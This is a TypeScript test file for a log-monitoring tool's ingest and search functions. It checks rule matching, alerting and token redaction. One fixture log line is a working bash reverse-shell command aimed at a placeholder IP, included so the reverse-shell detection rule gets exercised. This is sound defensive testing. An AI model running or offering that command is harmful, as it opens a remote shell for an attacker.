import { beforeEach, describe, expect, it, vi } from "vitest";

// These tests stub global fetch with fake hosts; SSRF blocking is covered in http-guard/ and channels.ssrf.test.ts.
vi.mock("@/lib/http-guard/safe-fetch", async (orig) => ({
  ...(await orig<typeof import("@/lib/http-guard/safe-fetch")>()),
  guardedFetch: (input: RequestInfo | URL, init?: RequestInit) => globalThis.fetch(input, init),
}));
import { resetAlertCooldowns } from "@/lib/alerts/cooldown";
import { setAlertsPaused } from "@/lib/alerts/pause";
import { getDb, resetDbForTests } from "@/lib/db/client";
import {
  createOrgAndAdmin,
  registerAgentPersistent,
  upsertAlertChannel,
} from "@/lib/db/store";
import { ingestAgentLogs, searchLogEvents } from "./ingest";

describe("log ingest + search", () => {
  beforeEach(() => {
    process.env.HEIMDALL_DB_DRIVER = "pglite";
    process.env.HEIMDALL_BOOTSTRAP_TOKEN = "test-token";
    delete process.env.DATABASE_URL;
    resetDbForTests();
    resetAlertCooldowns();
    setAlertsPaused(false);
  });

  it("stores lines, matches rules, and fires alerts", async () => {
    const { org } = await createOrgAndAdmin({
      orgName: "Log Org",
      adminName: "Admin",
      email: "logs@example.com",
      password: "CorrectHorse1",
    });

    const fetchMock = vi.fn(async () => new Response("ok", { status: 200 }));
    vi.stubGlobal("fetch", fetchMock);

    await upsertAlertChannel({
      orgId: org.id,
      kind: "slack",
      config: { url: "https://hooks.example/slack" },
    });

    const registered = await registerAgentPersistent({
      token: "test-token",
      hostname: "edge-logs",
      version: "0.7.0",
    });
    expect(registered.ok).toBe(true);
    if (!registered.ok) return;

    const result = await ingestAgentLogs({
      agentId: registered.agent.id,
      lines: [
        {
          source: "/var/log/auth.log",
          line: "Failed password for root from 203.0.113.50 port 43321 ssh2",
        },
        {
          source: "/var/log/auth.log",
          line: "Accepted publickey for deploy from 10.0.0.8 port 52222 ssh2",
        },
        {
          source: "stdout",
          line: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
        },
      ],
    });

    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.accepted).toBe(3);
    expect(result.matches).toBeGreaterThanOrEqual(2);
    expect(result.alertsFired).toBeGreaterThanOrEqual(1);
    expect(fetchMock).toHaveBeenCalled();

    const matches = await searchLogEvents({
      orgId: org.id,
      matchesOnly: true,
    });
    expect(matches.length).toBeGreaterThanOrEqual(2);
    expect(matches.some((m) => m.matches.some((x) => x.ruleId === "reverse_shell"))).toBe(
      true,
    );

    const ssh = await searchLogEvents({
      orgId: org.id,
      ruleId: "ssh_failed_password",
    });
    expect(ssh.length).toBeGreaterThanOrEqual(1);

    vi.unstubAllGlobals();
  });

  it("redacts Heimdall tokens and records routine sudo without alerting", async () => {
    const { org } = await createOrgAndAdmin({
      orgName: "Sudo Org",
      adminName: "Admin",
      email: "sudo@example.com",
      password: "CorrectHorse1",
    });
    const registered = await registerAgentPersistent({
      token: "test-token",
      hostname: "media",
      version: "0.7.0",
    });
    expect(registered.ok).toBe(true);
    if (!registered.ok) return;

    const token = "hdt_FAKEtoken1111111111111111111111111111";
    const result = await ingestAgentLogs({
      agentId: registered.agent.id,
      lines: [
        {
          source: "journald",
          line: `{"_CMDLINE":"sudo TOKEN=${token} bash","MESSAGE":"alice : TTY=/dev/pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/bash","SYSLOG_IDENTIFIER":"sudo"} sudo: alice : TTY=/dev/pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/bash`,
        },
      ],
    });
    expect(result.ok).toBe(true);
    if (!result.ok) return;
    expect(result.matches).toBe(1);
    expect(result.alertsFired).toBe(0);

    const db = await getDb();
    const stored = await db.query<{ line: string; severity: string }>(
      `SELECT line, severity FROM log_events WHERE org_id = $1`,
      [org.id],
    );
    expect(stored.rows).toHaveLength(1);
    expect(stored.rows[0].line).not.toContain(token);
    expect(stored.rows[0].line).toContain("TOKEN=hdt_[REDACTED]");
    expect(stored.rows[0].severity).toBe("low");

    const rules = await db.query<{ metric: string }>(
      `SELECT metric FROM alert_rules WHERE org_id = $1 AND metric LIKE 'log_match:sudo%'`,
      [org.id],
    );
    expect(rules.rows.map((r) => r.metric)).toEqual(["log_match:sudo_abuse"]);
  });
});
